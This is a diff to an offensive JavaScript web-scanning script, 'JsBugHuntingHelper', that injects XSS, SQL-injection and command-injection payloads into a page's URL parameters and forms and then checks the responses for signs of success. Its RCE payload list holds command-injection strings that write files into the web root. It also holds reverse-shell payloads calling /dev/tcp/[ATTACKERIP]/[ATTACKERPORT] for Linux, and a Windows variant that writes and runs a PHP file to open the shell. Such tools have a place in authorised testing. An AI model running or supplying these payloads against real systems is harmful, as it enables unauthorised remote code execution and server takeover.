@@ -1,5 +1,3 @@
-/* eslint-disable no-eval */
-/* eslint-disable no-useless-escape */
 /* eslint-disable no-undef */
 // Created by Davide Cavallini
 // You'll find interesting functions and some bugs
@@ -30,22 +28,19 @@ function JsBugHuntingHelper () {
     // '/"><script>alert("XSS_VULNERABLE_PARAM")</script><span "'
   ]
   const payloadsSQLi = ['"', "'"]
-
-  const previousRceAction = "data = data.replace('echo+TEST_RCE','').replace('echo TEST_RCE','').replace(\"'TEST_RCE'\",'')"
-  const genericRceResult = "data.indexOf('TEST_RCE') !== -1"
   const payloadsRCE = [
-    { payloadString: 'test" || echo TEST_RCE > /var/www/html/testRCE.php && cat /var/www/html/testRCE.php || "', expectedResult: genericRceResult },
-    { payloadString: 'test" || echo TEST_RCE > /var/www/testRCE.php && cat /var/www/testRCE.php || "', expectedResult: genericRceResult },
-    { payloadString: '"+%26%26+echo+TEST_RCE+%26%26+"', expectedResult: genericRceResult },
-    { payloadString: '" && echo TEST_RCE && "', expectedResult: genericRceResult },
-    { payloadString: 'echo TEST_RCE', expectedResult: genericRceResult },
-    { payloadString: '1" && echo TEST_RCE #', expectedResult: genericRceResult },
-    { payloadString: '" || echo TEST_RCE ||', expectedResult: genericRceResult },
+    'test" || echo TEST_RCE > /var/www/html/testRCE.php || "',
+    'test" || echo TEST_RCE > /var/www/testRCE.php || "',
+    '"+%26%26+echo+TEST_RCE+%26%26+"',
+    '" && echo TEST_RCE && "',
+    'echo TEST_RCE',
+    '1" && echo TEST_RCE #',
+    '" || echo TEST_RCE ||',
     /* Linux payload */
-    { payloadString: '1" || /bin/bash -c \'bash -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\' #', expectedResult: genericRceResult },
-    // '1" || /bin/bash -c \'bash -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1'",
+    '1" || /bin/bash -c \'bash -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\' #',
+    // '1" || /bin/bash -c \'bash -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\'',
     /* Windows payload */
-    { payloadString: '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c \\"bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\\"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php #', expectedResult: genericRceResult }
+    '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c \\"bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\\"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php #'
     // '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c \\"bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\\"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php'
     // '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c "bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php #',
     // '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c \\"bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\\"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php #'
@@ -551,21 +546,40 @@ function JsBugHuntingHelper () {
     for (let i = 0; i < paramsEntitiesTemp.length; i++) {
       for (const payload of payloadsRCE) {
         const paramsEntities = Object.entries(getAllUrlParams(document.location.href))
-        const newUrl2 = document.location.origin + document.location.pathname
+        const v = paramsEntities[i]
+        v[1] = v[1] + payload.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort)
 
-        const r = await new Payload(
-          newUrl2,
-          'GET',
-          paramsEntities,
-          previousRceAction,
-          payload.payloadString.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort),
-          // eslint-disable-next-line no-useless-escape
-          payload.expectedResult,
-          'RCE'
-        ).isValidResponse()
-        if (r !== false) {
-          result.push(r)
-        }
+        const mod = paramsEntities.map((v) => {
+          return v[0] + '=' + v[1]
+        })
+
+        const newUrl = document.location.origin + document.location.pathname + '?' + mod.join('&')
+        const newUrl2 = document.location.origin + document.location.pathname
+        // console.log(newUrl)
+
+        // eslint-disable-next-line no-undef
+        try {
+          await $.get(newUrl).done(function (data) {
+            if (data.indexOf('TEST_RCE') !== -1 && data.indexOf('echo+TEST_RCE') === -1 && data.indexOf('echo TEST_RCE') === -1 && data.indexOf('\'TEST_RCE\'') === -1) {
+              result.push({ paramName: v[0], type: 'RCE via Url', url: newUrl })
+            }
+          })
+
+          // richiesta un po diversa via ajax
+          await $.get(newUrl2, Object.fromEntries(paramsEntities)).done(function (data) {
+            if (data.indexOf('TEST_RCE') !== -1 && data.indexOf('echo+TEST_RCE') === -1 && data.indexOf('echo TEST_RCE') === -1 && data.indexOf('\'TEST_RCE\'') === -1) {
+              result.push({ paramName: v[0], type: 'RCE via Url', url: newUrl })
+            }
+          })
+        } catch (reason) { console.log(reason) }
+        // eslint-disable-next-line no-undef
+        try {
+          await $.get(document.location.origin + '/testRCE.php').done(function (data) {
+            if (data.indexOf('TEST_RCE') !== -1) {
+              result.push({ paramName: v[0], type: 'RCE via Url', url: newUrl })
+            }
+          })
+        } catch (reason) { console.log(reason) }
       }
     }
     return result
@@ -664,7 +678,7 @@ function JsBugHuntingHelper () {
           // console.log(tempParams, i, tempParams.length, tempParams[i])
 
           if (tempParams[i] !== undefined) {
-            tempParams[i].value += payload.payloadString.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort)
+            tempParams[i].value += payload.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort)
 
             const form = document.createElement('form')
             form.method = method
@@ -781,7 +795,7 @@ function JsBugHuntingHelper () {
               }
             })
             if (tempParams[i] !== undefined) {
-              tempParams[i].value += payload.payloadString.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort)
+              tempParams[i].value += payload.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort)
               result.push(await sendFormRequest.call(this, form, tempParams, 'RCE', tempParams[i].name))
             }
           }
@@ -830,14 +844,26 @@ function JsBugHuntingHelper () {
             }
           } else if (vulnType === 'RCE') {
             if (context.rceScanEnabled === true) {
-              eval(previousRceAction)
-              if (eval(genericRceResult)) {
+              if (data.indexOf('TEST_RCE') !== -1 && data.indexOf('echo+TEST_RCE') === -1 && data.indexOf('echo TEST_RCE') === -1 && data.indexOf('\'TEST_RCE\'') === -1) {
                 result = { paramName: modifiedParam, type: 'RCE via POST Form', params }
                 // console.log('Parametro GET "' + modifiedParam + '" Vulnerabile ad SQL Injection')
               }
             }
           }
         })
+        if (vulnType === 'RCE') {
+          // qui è giusto che sia get, in quanto è un altra richiesta
+          if (context.rceScanEnabled === true) {
+            try {
+              $.get(document.location.origin + '/testRCE.php').done(function (data) {
+                if (data.indexOf('TEST_RCE') !== -1) {
+                  result = { paramName: modifiedParam, type: 'RCE via POST Form', params }
+                  // console.log('Parametro POST "' + modifiedParam + '" Vulnerabile a Remote Code Execution')
+                }
+              })
+            } catch (reason) { console.log(reason) }
+          }
+        }
       } catch (reason) { console.log(reason) }
     } else if ($(form).attr('method') === 'GET' || $(form).attr('method') === 'get' || $(form).attr('method') === '$_GET' || $(form).attr('method') === '$_get') {
       try {
@@ -859,8 +885,7 @@ function JsBugHuntingHelper () {
             }
           } else if (vulnType === 'RCE') {
             if (context.rceScanEnabled === true) {
-              eval(previousRceAction)
-              if (eval(genericRceResult)) {
+              if (data.indexOf('TEST_RCE') !== -1 && data.indexOf('echo+TEST_RCE') === -1 && data.indexOf('echo TEST_RCE') === -1 && data.indexOf('\'TEST_RCE\'') === -1) {
                 // console.log(data)
                 result = { paramName: modifiedParam, type: 'RCE via GET Form', params }
               // console.log('Parametro GET "' + modifiedParam + '" Vulnerabile ad SQL Injection')
@@ -868,6 +893,18 @@ function JsBugHuntingHelper () {
             }
           }
         })
+        if (vulnType === 'RCE') {
+          if (context.rceScanEnabled === true) {
+            try {
+              await $.get(document.location.origin + '/testRCE.php').done(function (data) {
+                if (data.indexOf('TEST_RCE') !== -1) {
+                  result = { paramName: modifiedParam, type: 'RCE via GET Form', params }
+                // console.log('Parametro GET "' + modifiedParam + '" Vulnerabile a Remote Code Execution')
+                }
+              })
+            } catch (reason) { console.log(reason) }
+          }
+        }
       } catch (reason) { console.log(reason) }
     }
     return result
